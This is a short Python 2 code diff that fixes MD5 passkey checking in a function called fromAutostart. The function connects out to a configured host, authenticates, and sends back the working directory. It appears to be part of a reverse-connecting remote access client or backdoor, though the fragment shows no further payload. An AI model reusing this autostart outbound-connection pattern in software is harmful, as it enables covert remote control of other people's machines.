@@ -62,7 +62,9 @@ def fromAutostart():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((HOST, PORT))
             data = Receive(s)
-            if hashlib.md5().update(data).hexdigest() == passKey:
+            _hash = hashlib.md5()
+            _hash.update(data)
+            if _hash.hexdigest() == passKey:
                 active = True
                 Send(s, '<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">' + os.getcwdu() + '</p>')
                 print 'Access Success'
